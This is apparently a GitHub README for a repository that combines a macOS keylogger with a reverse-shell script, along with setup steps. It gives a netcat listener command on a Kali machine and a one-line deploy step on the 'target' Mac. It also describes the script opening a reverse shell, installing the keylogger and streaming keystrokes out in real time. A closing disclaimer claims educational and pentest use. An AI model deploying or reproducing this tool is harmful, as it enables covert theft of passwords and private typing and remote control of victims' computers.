
# Keylogger & Reverse Shell Integration

This repository contains a keylogger made by **Casey Scarborough** for macOS and a **reverse shell** integration script. The keylogger captures keystrokes from a target macOS device and sends the logs to a remote Kali Linux machine over a persistent network connection.

## Features
- **Reverse Shell**: Opens a reverse shell from the macOS device to the Kali Linux machine.
- **Keylogger**: Records keystrokes on the macOS device and continuously sends the logs to the Kali machine.
- **Socket Integration**: Uses a socket-based system to send logs in real-time.
- **Automated Setup**: Automatically clones the repository, installs dependencies, and sets up the keylogger and reverse shell.

## Requirements

- **macOS device**: The target device you wish to run the keylogger on.
- **Kali Linux**: The attacking machine (or the machine you are listening on).
- **Python 3**: Ensure Python 3 is installed on the macOS device.
- **Net-Cat**: Net Cat has to be installed on both machines
- **Git**: To clone the repository.

## Setup Instructions

### 1. Clone This Repository

On your **Kali Linux** machine, and your **macOS device**, clone the repository using Git:

```bash
git clone https://github.com/TomatoBr0/keylogger-sender.git
cd keylogger-sender
```

### 2. Set Up the Listener on Kali Linux

On your **Kali Linux** machine, open a terminal and listen for incoming data from the keylogger:

```bash
nc -lvnp 5555 > received_logs.txt
```

This will save all received keystrokes to `received_logs.txt`.

### 3. Deploy the Script on the Target macOS Device

On the **macOS** device, run the following script to open a reverse shell and install the keylogger:

```bash
python3 reverse_shell.py
```

The script will:
- Open a reverse shell to your Kali machine.
- Clone the repository, compile the keylogger, and install it.
- Start the keylogger and continuously send logs back to your Kali machine.

### 4. Monitoring the Logs

As the keylogger runs on the macOS device, all captured keystrokes will be sent to your **Kali Linux** machine in real-time and saved in the `received_logs.txt` file.

### 5. Stopping the Keylogger

To stop the keylogger on the macOS device, you can simply terminate the process or reboot the device.

---

## Legal and Ethical Disclaimer

**Only use this tool on systems that you own or have explicit permission to test. Unauthorized use is illegal and unethical.**

This repository is intended for educational purposes and ethical penetration testing only. Always ensure that you have proper authorization before deploying any monitoring software.

